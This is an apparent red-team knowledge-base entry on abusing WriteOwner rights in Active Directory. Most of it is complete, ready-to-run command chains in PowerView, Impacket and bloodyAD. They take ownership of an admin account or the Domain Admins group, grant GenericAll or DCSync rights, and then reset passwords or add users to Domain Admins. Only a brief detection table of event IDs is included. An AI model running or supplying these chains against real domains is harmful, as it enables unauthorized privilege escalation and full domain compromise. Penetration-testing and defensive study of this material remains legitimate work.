---
title: "Attack #22 — WriteOwner Abuse"
description: "WriteOwner allows an attacker to change the owner of an AD object to themselves. Since the owner of an object has the implicit right to modify the…"
category: active-directory
tags: ["active-directory", "adcs", "credential-access", "delegation"]
tools: ["Impacket", "PowerShell"]
difficulty: advanced
updated: "2026-08-10"
source: "vault:ActiveDirectory/AD-Attack/Category-Three/🟡 Attack #22 — WriteOwner Abuse.md"
---
# 🟡 Attack #22 — WriteOwner Abuse

***

## 📖 How It Works

WriteOwner allows an attacker to **change the owner of an AD object** to themselves. Since the owner of an object has the **implicit right to modify the object's DACL** (WriteDACL), this creates a two-step escalation: take ownership → grant yourself GenericAll/WriteDACL → exploit the object. This is a stepping stone attack, commonly found in enterprise environments due to legacy delegation configurations.

### Exploitation Chain

```
1. Have WriteOwner on a target object
2. Change owner to yourself → Set-DomainObjectOwner
3. Now you have implicit WriteDACL
4. Grant yourself GenericAll → Add-DomainObjectAcl
5. Exploit: reset password / add to group / DCSync / etc.
```

***

## ⚙️ Prerequisites

| Requirement | Detail |
|---|---|
| **WriteOwner ACE on target** | Your principal has WriteOwner in the target's DACL |
| **Domain user account** | Any authenticated domain user |

***

## 🛠️ Tools

| Tool | Platform | Notes |
|---|---|---|
| **PowerView** | Windows | `Set-DomainObjectOwner`, `Add-DomainObjectAcl` |
| **Impacket — owneredit.py** | Linux | Change object ownership remotely |
| **Impacket — dacledit.py** | Linux | Modify DACL after taking ownership |
| **bloodyAD** | Linux | `set owner` command |

***

## 💻 Full Commands

### 🔴 Full Exploitation Chain (Windows)

```powershell
# ── Step 1: Take ownership ────────────────────────────────────────────────────
Import-Module .\PowerView.ps1
Set-DomainObjectOwner -Identity targetadmin -OwnerIdentity low_user -Verbose
# Or for a group:
Set-DomainObjectOwner -Identity "Domain Admins" -OwnerIdentity low_user

# ── Step 2: Grant yourself GenericAll (owner has implicit WriteDACL) ──────────
Add-DomainObjectAcl -TargetIdentity targetadmin -PrincipalIdentity low_user -Rights All
# Or for domain root (DCSync):
Add-DomainObjectAcl -TargetIdentity "DC=corp,DC=local" -PrincipalIdentity low_user -Rights DCSync

# ── Step 3: Exploit ──────────────────────────────────────────────────────────
# Password reset:
Set-DomainUserPassword -Identity targetadmin -AccountPassword (
  ConvertTo-SecureString 'P@ssword123!' -AsPlainText -Force
)
# Or add to group:
Add-DomainGroupMember -Identity "Domain Admins" -Members low_user
```

### 🔴 Full Exploitation Chain (Linux)

```bash
# ── Step 1: Take ownership ────────────────────────────────────────────────────
owneredit.py -action write -new-owner low_user -target targetadmin \
  corp.local/low_user:'Password1' -dc-ip 10.10.10.10

# ── Step 2: Grant GenericAll ──────────────────────────────────────────────────
dacledit.py -action write -rights FullControl -principal low_user -target targetadmin \
  corp.local/low_user:'Password1' -dc-ip 10.10.10.10

# ── Step 3: Exploit ──────────────────────────────────────────────────────────
bloodyAD -d corp.local -u low_user -p 'Password1' --host DC01.corp.local \
  set password targetadmin 'P@ssword123!'

# ── Or bloodyAD shortcut ──────────────────────────────────────────────────────
bloodyAD -d corp.local -u low_user -p 'Password1' --host DC01.corp.local \
  set owner targetadmin low_user
```

***

## 🛡️ Detection — Event IDs

| Event ID | Source | What to Look For |
|---|---|---|
| **4662** | Security Log (DC) | WriteOwner operation on AD object |
| **4670** | Security Log (DC) | Permissions changed on an object |
| **5136** | Security Log (DC) | Owner attribute modified |

***

## 🔗 Attack Chain Context

```
[WriteOwner] ──→ Take Ownership → WriteDACL → Full Control
         │
         ├──→ 🔑 Two-step escalation: WriteOwner → WriteDACL → GenericAll
         ├──→ 🔗 Chain with: WriteDACL (#21), GenericAll (#19)
         └──→ 💀 Defeated by: ACL auditing, monitor ownership changes
```

***

> ✅ **Attack #22 — WriteOwner Abuse complete.**
